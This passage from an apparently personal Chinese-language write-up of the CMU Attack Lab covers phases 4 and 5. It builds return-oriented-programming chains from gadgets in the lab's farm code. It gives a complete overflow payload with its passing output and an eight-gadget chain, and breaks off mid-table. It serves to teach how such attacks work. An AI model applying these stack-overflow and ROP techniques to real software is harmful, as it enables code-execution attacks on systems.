style=--0:#B392F0>objdump</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>-d</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>farm.o</span><span style=--0:#E1E4E8> </span><span style=--0:#F97583>></span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>farm.s</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="gcc -c farm.cobjdump -d farm.o > farm.s" data-copied=Copied!><div></div></button></div></figure></div><p>得到的farm.s文件与以上gdb结果理论上应该相同,但是我发现不同,farm.s每个函数都多了 <code>push</code>,<code>pop</code>这些操作,这是 [[机器级编程III(过程Procedure)#寄存器保存约定|被调用者保存的约定]] ,我猜这是编译器优化行为并且认为应该采用gdb中的结果.将以上gdb反汇编结果保存为farm.d,熟练使用vim查找功能抽取指令.</p><h2 id=phase-4>Phase 4</h2><p>Handout中提示我,这个问题使用两个gadget和 <code>pop</code> 指令,注入的字符串包括数据部分.既然使用两个gadget,那就需要用到 <code>test</code>函数以及调用<code>test</code>函数的栈帧.在gdb中</p><div class=expressive-code><figure class="frame is-terminal"><figcaption class=header><span class=title></span><span class=sr-only>Terminal window</span></figcaption><pre data-language=shell><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#B392F0>b</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>test</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span style=--0:#B392F0>layout</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>asm</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span style=--0:#B392F0>layout</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>regs</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code><span style=--0:#B392F0>r</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>-q</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="b testlayout asmlayout regsr -q" data-copied=Copied!><div></div></button></div></figure></div><p>可以发现 <code>test</code>函数的栈帧为8字节,其上的0x402044似乎为另一个函数的地址.一看果然 <img decoding=async fetchpriority=auto height=1826 loading=lazy src=/_astro/Pasted%20image%2020250125163221.BIQJFe4j_Z1n7idp.webp width=3072></p><p>结合ctarget中对 <code>getbuf</code>函数的认识,我可以画出获取输入时栈的情况:</p><table><thead><tr><th align=center>栈空间</th></tr></thead><tbody><tr><td align=center>(launch函数栈帧)</td></tr><tr><td align=center>0x402044 &#x3C;launch+112></td></tr><tr><td align=center>(test函数栈帧)</td></tr><tr><td align=center>8字节</td></tr><tr><td align=center>0x401976 &#x3C;test+14></td></tr><tr><td align=center>(getbuff函数栈帧)</td></tr><tr><td align=center>40字节buffer</td></tr><tr><td align=center>最直接的解法思路自然就是</td></tr></tbody></table><table><thead><tr><th align=center>栈空间</th><th align=center>填充</th></tr></thead><tbody><tr><td align=center>(launch函数栈帧)</td><td align=center></td></tr><tr><td align=center>0x4017ec</td><td align=center>return address</td></tr><tr><td align=center>(test函数栈帧)</td><td align=center></td></tr><tr><td align=center>8字节</td><td align=center>cookie</td></tr><tr><td align=center><code>5f c3</code>所在的地址</td><td align=center>gadget address 1</td></tr><tr><td align=center>(getbuff函数栈帧)</td><td align=center></td></tr><tr><td align=center>40字节buffer</td><td align=center>填充任意字符</td></tr><tr><td align=center>其中</td><td align=center></td></tr></tbody></table><div class=expressive-code><figure class=frame><figcaption class=header></figcaption><pre data-language=plaintext><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#e1e4e8>gadget 1:</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>pop    %rdi</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code>
</div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>5</div></div><div class=code><span style=--0:#e1e4e8>return address:</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>6</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>0x4017ec &#x3C;touch2></span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="gadget 1:  pop    %rdi  retreturn address:  0x4017ec <touch2>" data-copied=Copied!><div></div></button></div></figure></div><p>gadget address1 对应的字节指令是<code>5f c3</code>,但是在farm.d中找不到,只好借助中间变量 注意到</p><div class=expressive-code><figure class=frame><figcaption class=header></figcaption><pre data-language=plaintext><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#e1e4e8>0x00000000004019a7 &#x3C;addval_219+0>:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span style=--0:#e1e4e8># 58 90 c3 :  pop    %rax;ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span style=--0:#e1e4e8>0x00000000004019a0 &#x3C;addval_273+0>:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code><span style=--0:#e1e4e8># 48 89 c7 c3 :    movq  %rax,%rdi;ret</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="0x00000000004019a7 <addval_219+0>:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax# 58 90 c3 :  pop    %rax;ret0x00000000004019a0 <addval_273+0>:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax# 48 89 c7 c3 :    movq  %rax,%rdi;ret" data-copied=Copied!><div></div></button></div></figure></div><p>所以gadget应该设计为:</p><div class=expressive-code><figure class=frame><figcaption class=header></figcaption><pre data-language=plaintext><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#e1e4e8>gadget 1:</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>pop    %rax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code>
</div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>5</div></div><div class=code><span style=--0:#e1e4e8>gedget 2:</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>6</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>movq    %rax,%rdi</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>7</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>ret</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="gadget 1:  pop    %rax  retgedget 2:  movq    %rax,%rdi  ret" data-copied=Copied!><div></div></button></div></figure></div><p>相应地,栈空间应该设计为:</p><table><thead><tr><th align=center>栈空间</th><th align=center>填充</th></tr></thead><tbody><tr><td align=center>(launch函数栈帧)</td><td align=center></td></tr><tr><td align=center>0x4017ec</td><td align=center>touch2 address</td></tr><tr><td align=center>0x4019a2</td><td align=center>gadget address 2</td></tr><tr><td align=center>(test函数栈帧)</td><td align=center></td></tr><tr><td align=center>8字节</td><td align=center>cookie</td></tr><tr><td align=center>0x4019ab</td><td align=center>gadget address 1</td></tr><tr><td align=center>(getbuff函数栈帧)</td><td align=center></td></tr><tr><td align=center>40字节buffer</td><td align=center>填充任意字符</td></tr><tr><td align=center>根据以上设计,填充的字符串为</td><td align=center></td></tr></tbody></table><div class=expressive-code><figure class=frame><figcaption class=header></figcaption><pre data-language=plaintext><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#e1e4e8>/* Phase4 */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span style=--0:#e1e4e8>ff ff ff ff ff ff ff ff ff ff</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span style=--0:#e1e4e8>ff ff ff ff ff ff ff ff ff ff</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code><span style=--0:#e1e4e8>ff ff ff ff ff ff ff ff ff ff</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>5</div></div><div class=code><span style=--0:#e1e4e8>ff ff ff ff ff ff ff ff ff ff</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>6</div></div><div class=code><span style=--0:#e1e4e8>/* 以上40字节 */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>7</div></div><div class=code><span style=--0:#e1e4e8>ab 19 40 00 00 00 00 00 /* gadget address 1 */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>8</div></div><div class=code><span style=--0:#e1e4e8>fa 97 b9 59 00 00 00 00 /* cookie: 59b997fa */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>9</div></div><div class=code><span style=--0:#e1e4e8>a2 19 40 00 00 00 00 00 /* gadget address 2 */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>10</div></div><div class=code><span style=--0:#e1e4e8>ec 17 40 00 00 00 00 00 /* touch2 address */</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="/* Phase4 */ff ff ff ff ff ff ff ff ff ffff ff ff ff ff ff ff ff ff ffff ff ff ff ff ff ff ff ff ffff ff ff ff ff ff ff ff ff ff/* 以上40字节 */ab 19 40 00 00 00 00 00 /* gadget address 1 */fa 97 b9 59 00 00 00 00 /* cookie: 59b997fa */a2 19 40 00 00 00 00 00 /* gadget address 2 */ec 17 40 00 00 00 00 00 /* touch2 address */" data-copied=Copied!><div></div></button></div></figure></div><p>成功了!</p><div class=expressive-code><figure class="frame is-terminal"><figcaption class=header><span class=title></span><span class=sr-only>Terminal window</span></figcaption><pre data-language=shell><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#B392F0>$</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>./rtarget</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>-qi</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>Phase4-raw</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span style=--0:#B392F0>Cookie:</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>0x59b997fa</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span style=--0:#B392F0>Touch2!:</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>You</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>called</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>touch2</span><span style=--0:#E1E4E8>(</span><span style=--0:#B392F0>0x59b997fa</span><span style=--0:#E1E4E8>)</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code><span style=--0:#B392F0>Valid</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>solution</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>for</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>level</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>2</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>with</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>target</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>rtarget</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>5</div></div><div class=code><span style=--0:#B392F0>PASS:</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>Would</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>have</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>posted</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>the</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>following:</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>6</div></div><div class=code><span class=indent>        </span><span style=--0:#B392F0>user</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>id</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>bovik</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>7</div></div><div class=code><span class=indent>        </span><span style=--0:#B392F0>course</span><span style=--0:#E1E4E8>  </span><span style=--0:#9ECBFF>15213-f15</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>8</div></div><div class=code><span class=indent>        </span><span style=--0:#B392F0>lab</span><span style=--0:#E1E4E8>     </span><span style=--0:#9ECBFF>attacklab</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>9</div></div><div class=code><span class=indent>        </span><span style=--0:#B392F0>result</span><span style=--0:#E1E4E8>  </span><span style=--0:#9ECBFF>1:PASS:0xffffffff:rtarget:2:FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>AB</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>19</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>40</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FA</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>97</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>B9</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>59</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>A2</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>19</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>40</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>EC</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>17</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>40</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="$ ./rtarget -qi Phase4-rawCookie: 0x59b997faTouch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target rtargetPASS: Would have posted the following:        user id bovik        course  15213-f15        lab     attacklab        result  1:PASS:0xffffffff:rtarget:2:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00" data-copied=Copied!><div></div></button></div></figure></div><p>执行返回地址的时候栈顶指针已经在这块8字节地址内存的上方了. 遇到<code>ret</code>指令时,实质是将此时的栈顶指针上方当作返回地址取出并跳转.</p><h2 id=phase-5>Phase 5</h2><p>根据Handout的提示,可能需要用到8个gadget 注意到</p><div class=expressive-code><figure class=frame><figcaption class=header></figcaption><pre data-language=plaintext><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>0x0000000000401a03 &#x3C;addval_190+0>:   8d 87 41 48 89 e0       lea    -0x1f76b7bf(%rdi),%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span style=--0:#e1e4e8># 48 89 e0 c3:  movq     %rsp,%rax;ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>0x00000000004019a0 &#x3C;addval_273+0>:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code><span style=--0:#e1e4e8># 48 89 c7 c3 :     movq    %rax,%rdi;ret</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="  0x0000000000401a03 <addval_190+0>:   8d 87 41 48 89 e0       lea    -0x1f76b7bf(%rdi),%eax# 48 89 e0 c3:  movq     %rsp,%rax;ret  0x00000000004019a0 <addval_273+0>:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax# 48 89 c7 c3 :     movq    %rax,%rdi;ret" data-copied=Copied!><div></div></button></div></figure></div><p>如何在栈空间中连续存放字符串呢?我注意到farm.c文件中有一个 <code>add_xy</code>函数:</p><div class=expressive-code><figure class=frame><figcaption class=header></figcaption><pre data-language=c><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#F97583>long</span><span style=--0:#E1E4E8> </span><span style=--0:#B392F0>add_xy</span><span style=--0:#E1E4E8>(</span><span style=--0:#F97583>long</span><span style=--0:#E1E4E8> x, </span><span style=--0:#F97583>long</span><span style=--0:#E1E4E8> y)</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span style=--0:#E1E4E8>{</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span class=indent>    </span><span style=--0:#F97583>return</span><span style=--0:#E1E4E8> x</span><span style=--0:#F97583>+</span><span style=--0:#E1E4E8>y;</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code><span style=--0:#E1E4E8>}</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code=long add_xy(long x, long y){    return x+y;} data-copied=Copied!><div></div></button></div></figure></div><p>利用这个函数来计算字符串存放的位置相对于%rsp的偏移量 设计gadget:</p><div class=expressive-code><figure class=frame><figcaption class=header></figcaption><pre data-language=plaintext><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#e1e4e8>gadget 1:    # 0x401a06</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>movq    %rsp,%rax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code>
</div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>5</div></div><div class=code><span style=--0:#e1e4e8>gadget 2:    # 0x4019a2</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>6</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>movq    %rax,%rdi</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>7</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>8</div></div><div class=code><span style=--0:#e1e4e8># 以上,将%rsp处的值复制给了%rdi</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>9</div></div><div class=code>
</div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>10</div></div><div class=code><span style=--0:#e1e4e8>gadget 3:    # 0x4019ab</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>11</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>pop    %rax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>12</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>13</div></div><div class=code>
</div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>14</div></div><div class=code><span style=--0:#e1e4e8>gadget 4:    # 0x4019dd</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>15</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>movl    %eax,%edx</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>16</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>17</div></div><div class=code>
</div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>18</div></div><div class=code><span style=--0:#e1e4e8>gadget 5:    # 0x401a34</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>19</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>cmpb    %cl,cl</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>20</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>movl    %edx,%ecx</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>21</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>22</div></div><div class=code>
</div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>23</div></div><div class=code><span style=--0:#e1e4e8>gadget 6:    # 0x401a13</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>24</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>movl    %ecx,%esi</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>25</div></div><div class=code><span style=--0:#e1e4e8># 以上,将偏移量传给%esi.我本来是要相减的,但突然想起来movl会将高位全部设置成0,行不通了,只能向上方偏移.</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>26</div></div><div class=code>
</div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>27</div></div><div class=code><span style=--0:#e1e4e8>gadget 7:    # 0x4019d6</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>28</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>lea    (%rdi,%rsi,1),%rax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>29</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>30</div></div><div class=code>
</div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>31</div></div><div class=code><span style=--0:#e1e4e8>gadget 8:    # 0x4019a2</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>32</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>movq    %rax,%rdi</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>33</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>34</div></div><div class=code><span style=--0:#e1e4e8># 以上,将字符串指针传递给%rdi</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>35</div></div><div class=code><span class=indent><span style=--0:#e1e4e8> </span></span><span style=--0:#e1e4e8>touch3 address:0x4018fa</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="gadget 1:    # 0x401a06  movq    %rsp,%rax  retgadget 2:    # 0x4019a2  movq    %rax,%rdi  ret# 以上,将%rsp处的值复制给了%rdigadget 3:    # 0x4019ab  pop    %rax  retgadget 4:    # 0x4019dd  movl    %eax,%edx  retgadget 5:    # 0x401a34  cmpb    %cl,cl  movl    %edx,%ecx  retgadget 6:    # 0x401a13  movl    %ecx,%esi# 以上,将偏移量传给%esi.我本来是要相减的,但突然想起来movl会将高位全部设置成0,行不通了,只能向上方偏移.gadget 7:    # 0x4019d6  lea    (%rdi,%rsi,1),%rax  retgadget 8:    # 0x4019a2  movq    %rax,%rdi  ret# 以上,将字符串指针传递给%rdi touch3 address:0x4018fa" data-copied=Copied!><div></div></button></div></figure></div><p>覆写 <code>getbuf</code>函数的返回地址为gadget address 1,之上为gadget address 2,以此类推, 栈空间应该为</p><table><thead><tr><th align=center>栈空间</th><th align=center>填充</th><th align=center>备注</th></tr></thead><tbody><tr><td align=center>(launch函数栈帧)</td><td align=center></td><td align=center></td></tr><tr><td align=center>0x35 0x39…</td><td align=center>cookie string</td><td align=center></td></tr><tr><td align=center>0x4018fa</td><td align=center>touch3 address</td><td align=center></td></tr><tr><td align=center>0x4019a2</td><td align=center>gadget address 8</td><td align=center></td></tr><tr><td align=center>0x4019d6</td><td align=center>gadget address 7</td><td align=center></td></tr><tr><td align=center>0x401a13</td><td align=center>gadget address 6</td><td align=center></td></tr><tr><td align=center>0x401a34</td><td align=center>gadget address 5</td><td align=center></td></tr><tr><td align=center>0x4019dd</td><td align=center>gadget address 4</td><td align=center></td></tr><tr><td align=center>0x48</td><td align=center>0x48</td><td align=center>偏移量</td></tr><tr><td align=center>0x4019ab</td><td align=center>gadget address 3</td><td align=center></td></tr><tr><td align=center>0x4019a2</td><td align=center>gadget address 2</td><td align=center>执行gadget 1时的%rsp</td></tr><tr><td 